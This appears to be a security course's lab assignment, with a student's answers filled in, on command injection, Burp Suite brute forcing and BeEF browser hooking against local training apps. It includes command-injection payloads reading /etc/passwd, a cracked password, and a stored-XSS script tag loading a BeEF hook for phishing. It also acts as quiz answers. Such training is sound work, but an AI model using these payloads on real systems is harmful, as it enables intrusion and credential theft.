Instructions
Testing Web Applications for Vulnerabilities
For this Challenge assignment, you will continue playing the role of an application security engineer at Replicants. Replicants has created several new web applications and would like you to continue testing them for vulnerabilities. your manager would like you to research and test a tool called BeEF to understand the organizational impact if Replicants were targeted with this tool.

Lab Environment
You will continue to use your Web Lab for this assignment.

Topics Covered in This Assignment
Web application vulnerability assessments
Injection
Brute force attacks
Broken authentication
Burp Suite
Web proxies
Directory traversal
Dot-dot-slash attacks
BeEF
Cross-site scripting
Malicious payloads
Instructions
In this assignment, you will test three web application vulnerabilities. For each vulnerability, you will be provided with the following:

Steps detailing how to set up and access the application
A demonstration explaining how the application is intended to work
A task that will test the application for vulnerabilities
Your goal is to determine whether each application is vulnerable and, if so, provide mitigations.

Deliverable
As you work through the Challenge, take notes of the payload and passwords used to answer the questions in this Challenge quiz.

 

Web Application 1: Your Wish is My Command Injection
Complete the following steps to set up the activity:

Access your web lab and open a browser.

Navigate to the webpage http://192.168.13.25Links to an external site. and select the "Command Injection" option.

Alternatively, access the webpage directly at this page: http://192.168.13.25/vulnerabilities/exec/Links to an external site.

The webpage should resemble the following image:

A screenshot depicts the webpage with the "Command Injection" option highlighted.

note
If you have any trouble accessing this webpage, refer to the following activity setup steps that we completed in the activity "Testing SQL Injection on Web Applications" on Day 1 of this module:

Launch your web lab.

Then, open the command line and run the following command: cd ./Documents/web-vulns && docker-compose up.

Leave this page open and continue to the next step.

To access the Replicants website, open a web browser within your web lab, and access the following webpage: http://192.168.13.25/setup.phpLinks to an external site.

On the bottom of this page, click "Create / Reset Database."

This will configure the database for the application.

The message "Setup Successful" at the bottom of the page indicates that it's complete.

To log into the mock Replicants website, access the following webpage: http://192.168.13.25/login.php.Links to an external site.

Log in with the following credentials:

Username: admin
Password: password
This page is a new web application built by Replicants to enable their customers to ping an IP address. The webpage will return the results of the ping command to the user.

Complete the following steps to move through the intended purpose of the web application:

Test the webpage by entering the IP address 127.0.0.1. When you press "Submit" the results should display on the web application, as the following image shows:

A screenshot depicts the results of entering the IP address and pressing "Submit."

Behind the scenes, when you select "Submit," the IP that you typed in the field is injected into a command that is run against the Replicants web server. The specific command that runs on the web server is ping <IP>, and in this case, 127.0.0.1 is the field value that was injected into that command.

This process is no different than if we went to the command line and typed the command ping 127.0.0.1, as the following image shows:

A screenshot depicts the results of the <code>ping 127.0.0.1</code> command.

Test whether you can manipulate the input to cause an unintended result.

On the same webpage, enter the following command (payload) in the field: 127.0.0.1 && pwd.

This command uses two ampersands to add a second command to the original request:

pwd is the second command. It will display the directory location where the command is run on the Replicants webserver.

This is no different than running ping 127.0.0.1 && pwd on the command line.

Press Enter. Note that the ping results include the results of the second pwd command, as the following image shows:

A screenshot displays the results of the command.

This type of injection attack is called command injection, and it depends on the web application taking user input to run a command against an operating system.

Now that you've determined that Replicants's new application is vulnerable to command injection, you are tasked with using the dot-dot-slash method to design two payloads that will display the contents of the following files:

/etc/passwd

/etc/hosts

hint
Try testing out a command directly on the command line to help design your payload.

```
127.0.0.1 && cat ../../../../../etc/passwd
127.0.0.1 && cat ../../../../../etc/hosts
127.0.0.1 && cat /etc/passwd
127.0.0.1 && cat /etc/hosts

```


Web Application 2: A Brute Force to Be Reckoned With
Complete the following steps to set up the activity:

Open a browser on Web Lab and navigate to the webpage http://192.168.13.35/install.phpLinks to an external site.

The page should resemble the following image:

A screenshot depicts the bWAPP webpage.

Click "here" to install bWapp. (See the arrow in the previous screenshot.)

After successfully installing bWapp, use the following credentials to log in:

Login: bee
Password: bug
A screenshot depicts the login page with the credentials filled in.

This will take you to the "Portal" page, as the following image shows:

A screenshot depicts the "Portal" webpage.

To access the application where you'll conduct the activity, enter the following URL: http://192.168.13.35/ba_insecure_login_1.phpLinks to an external site.

This will take you to the "Broken Auth - Insecure Login Forms" page, as the following image shows:
A screenshot depicts the webpage with the navigation bar highlighted.

This page is an administrative web application that serves as a simple login page. An administrator enters their username and password and selects "Login."

If the user/password combination is correct, the application will return a success message.

If the user/password combination is incorrect, the application will return the message "Invalid credentials."

Years ago, Replicants had a system breach and several administrators' passwords were stolen by a malicious hacker. The hacker was only able to capture a list of passwords, not the associated accounts' usernames. However, your manager is concerned that one of the administrators who accesses this new web application is using one of the compromised passwords. Therefore, there is a risk that the malicious hacker could use these passwords to access an administrator's account and view confidential data.

Use the web application tool Burp Suite—specifically, the Burp Suite Intruder feature—to determine whether any of the administrator accounts are vulnerable to a brute force attack on this web application.

Use the following lists of administrators and breached passwords.

List of administrators:
 1.  superman
 2.  loislane
 3.  spiderman
 4.  jennyjones
 5.  tonystark
 6.  timtom
 7.  peterparker
 8.  clarkkent
 9.  michaelsmith
 10. henryhacker
List of breached passwords:
 1.  Up, up and away!
 2.  Avengers Assemble
 3.  Cowabunga! 
 4.  Here I come to Save the Day
 5.  With great power comes great responsibility
 6.  You wouldn’t like me when I’m angry
 7.  Courage is immortal
 8.  I am Iron Man
 9.  His Past. Our future
 10. Change is coming
hint
Refer to the Burp Intruder activity "Conducting Brute Force Attacks with Burp Intruder" from Day 3 for guidance.

```
tonystark with pass - I am Iron Man output shows Successful login! You really are Iron Man :)

```

Web Application 3: Where's the BeEF?
Complete the following steps to set up the activity:

On your web lab, open a command line and run the following command: cd ~/Documents/web-vulns.

Run docker-compose up and wait for the containers to load.

When prompted for a password, enter cybersecurity.

To access BeEF's graphic user interface (GUI) open your browser and go to: http://127.0.0.1:3000/ui/panel.

When the BeEF webpage opens, log in with the following credentials:

Username: beef
Password: feeb
A screenshot depicts the login page with the credentials entered.

You have successfully completed the setup when you reach the BeEF control panel, as shown in the following image:

A screenshot depicts the BeEF control panel.

The Browser Exploitation Framework (BeEF) is a practical client-side attack tool that exploits web browser vulnerabilities to assess a target's security posture.

While BeEF was developed for lawful research and penetration testing, criminal hackers leverage it as an attack tool.

An attacker takes a small snippet of code, called a BeEF Hook, and finds a way to add this code into a target website. This is commonly done by cross-site scripting.

When subsequent users access the infected website, the users' browsers become hooked.

Once a browser is hooked, it is referred to as a zombie. A zombie is an infected browser that awaits instructions from the BeEF control panel.
The BeEF control panel has hundreds of exploits that can be launched against the hooked victims, including:
Social engineering attacks
Confidential data stolen from the user's machine
System and network information access from the user's machine
BeEF includes a feature that runs a simulation of an infected website.

To access this simulated infected website, locate the following sentence on the BeEF control panel: "To begin with, you can point a browser towards the basic demo page here, or the advanced version here."

Click the second "here" to access the advanced version, as the following image shows:

A screenshot depicts the BeEF control panel and highlights the second "here."

This will open The Butcher website, which has been infected with a BeEF hook, as the following image shows:

A screenshot depicts the Butcher homepage.

Note that once you have pulled up this infected webpage, your browser has been hooked!

If your browser has not been hooked, restart your browser and try again.
Return to the control panel. In the left-hand "Hooked Browsers" panel, notice that your browser has become infected since accessing the infected Butcher website. Note that if multiple browsers become infected, they will each be listed in this left-hand panel. Click the browser 127.0.0.1. The "Details" tab will display information about the infected browser, as shown in the following screenshot:

A screenshot depicts the <code>127.0.01</code> browser selected in the "Hooked Browsers" panel and information about the browser in the "Details" tab.

Now, you're ready to test an exploit. To do so, complete the following steps:

Select the "Commands" tab.

This will list folders of hundreds of exploits that can be run against the hooked browser. Many may not work, as they are dependent on the browser and security settings enabled.
First, you'll attempt a social engineering phishing exploit to create a fake Google login pop-up. You can use this to capture user credentials.

To access this exploit, select "Google Phishing" within the "Social Engineering" folder, as the following image shows:

A screenshot depicts the list of folders in the "Commands" tab, with "Google Phishing" under the "Social Engineering" folder highlighted.

After selecting this option, the right-hand pane will display a description of the exploit and any dependencies or options, as the following image shows:

A screenshot depicts the right-hand pane with details about the Google Phishing exploit.

To launch the exploit, select "Execute" in the bottom-right corner.

After selecting "Execute," return to the browser that was displaying the Butcher Shop website. Note that it has changed to a Google login page.

A victim could easily mistake this for a real login prompt.

Let's find out what would happen if a victim entered their credentials. Use the following credentials to log in to the fake Google page:

Username: hackeruser
Password: hackerpass
A screenshot displays the fake Google login page with the username and password fields highlighted.

Return to the BeEF control panel. In the center pane ("Module Results History"), select the first option. Note that in the right-hand pane, the user's username and password have now been captured by the attacker, as the following image shows:

A screenshot depicts the command panel.

Now that you know how to use the BeEF tool, you'll use it to test the Replicants web application. You are tasked with using a stored XSS attack to inject a BeEF hook into Replicants's main website.

Task details:

You will test the Replicants Stored XSS application page (which we used on the first day of this module): http://192.168.13.25/vulnerabilities/xss_s/.
The BeEF hook, which was returned after running the sudo beef command, was: http://127.0.0.1:3000/hook.js.
The payload to inject with this BeEF hook is: <script src="http://127.0.0.1:3000/hook.js"></script>.
When you attempt to inject this payload, you will encounter a client-side limitation that will not allow you to enter the whole payload. You will need to find a way around this limitation.

hint
Try right-clicking and selecting "Inspecting the Element."

```
remove minlenght from the inpect developer tool and 
<script src="http://127.0.0.1:3000/hook.js"></script>
```

Once you are able to hook into Replicants's website, attempt a couple of BeEF exploits. Some that may work well include:

Social Engineering > Pretty Theft

Social Engineering > Fake Notification Bar

Host > Get Geolocation (Third Party)

Now use your notes on the payloads and passwords to answer the following questions in the quiz!